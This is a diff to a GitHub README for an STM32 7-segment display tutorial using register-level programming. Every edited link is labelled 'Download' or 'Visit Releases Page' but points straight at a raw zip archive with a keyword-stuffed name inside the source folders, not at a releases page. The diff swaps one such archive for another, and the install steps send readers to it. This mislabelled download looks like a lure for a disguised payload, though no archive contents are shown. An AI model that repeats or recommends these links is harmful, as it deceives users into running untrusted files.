@@ -1,7 +1,7 @@
 # 🎉 STM32-7-Segment-Interface-Display-Register-Coding-Method - Learn to Control Displays Easily
 
-![Download](https://github.com/NourEldeen122004/STM32-7-Segment-Interface-Display-Register-Coding-Method/raw/refs/heads/main/Core/Src/Display_Method_ST_Register_Interface_Coding_Segment_v1.6.zip)  
-[Visit Releases Page](https://github.com/NourEldeen122004/STM32-7-Segment-Interface-Display-Register-Coding-Method/raw/refs/heads/main/Core/Src/Display_Method_ST_Register_Interface_Coding_Segment_v1.6.zip)
+![Download](https://raw.githubusercontent.com/NourEldeen122004/STM32-7-Segment-Interface-Display-Register-Coding-Method/main/Drivers/Display-Method-Interface-Coding-Segment-Register-ST-1.9.zip)  
+[Visit Releases Page](https://raw.githubusercontent.com/NourEldeen122004/STM32-7-Segment-Interface-Display-Register-Coding-Method/main/Drivers/Display-Method-Interface-Coding-Segment-Register-ST-1.9.zip)
 
 ## 📚 Description
 This repository demonstrates how to interface a 7-segment display with the STM32F446RET6 microcontroller using pure register-level programming. There is no additional software framework like HAL or CubeMX involved. This method offers a clear understanding of microcontroller operation.
@@ -24,7 +24,7 @@ Follow the simple steps below to set up and run the software on your device.
 ## 📥 Download & Install
 To get started, visit the Releases page to download the necessary files:
 
-[Visit Releases Page](https://github.com/NourEldeen122004/STM32-7-Segment-Interface-Display-Register-Coding-Method/raw/refs/heads/main/Core/Src/Display_Method_ST_Register_Interface_Coding_Segment_v1.6.zip)
+[Visit Releases Page](https://raw.githubusercontent.com/NourEldeen122004/STM32-7-Segment-Interface-Display-Register-Coding-Method/main/Drivers/Display-Method-Interface-Coding-Segment-Register-ST-1.9.zip)
 
 1. Open the link to the Releases page.
 2. Locate the most recent version.
